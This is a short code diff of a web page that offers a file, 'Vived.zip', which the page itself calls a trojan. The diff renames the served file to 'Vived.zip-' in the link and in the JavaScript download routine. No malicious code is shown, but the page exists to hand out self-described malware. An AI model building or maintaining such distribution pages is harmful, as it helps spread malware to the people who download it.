@@ -57,7 +57,7 @@
 <main>
   <h1>Vived.zip</h1>
   <p>⚠️ Vived.zip es un troyano, Usalo bajo tu propio riesgo ⚠️</p>
-  <a class="btn" id="dl" href="Vived.zip" download>Descargar Vived.zip</a>
+  <a class="btn" id="dl" href="Vived.zip-" download>Descargar Vived.zip</a>
   <p id="msg" role="alert" hidden></p>
 </main>
 
@@ -101,12 +101,12 @@
     e.preventDefault();
     msg.hidden = true;
     try {
-      const res = await fetch('Vived.zip', { cache: 'no-store' });
+      const res = await fetch('Vived.zip-', { cache: 'no-store' });
       if (!res.ok) throw new Error('not found');
       const url = URL.createObjectURL(await res.blob());
       const a = document.createElement('a');
       a.href = url;
-      a.download = 'Vived.zip';
+      a.download = 'Vived.zip-';
       a.click();
       URL.revokeObjectURL(url);
       msg.className = 'ok';
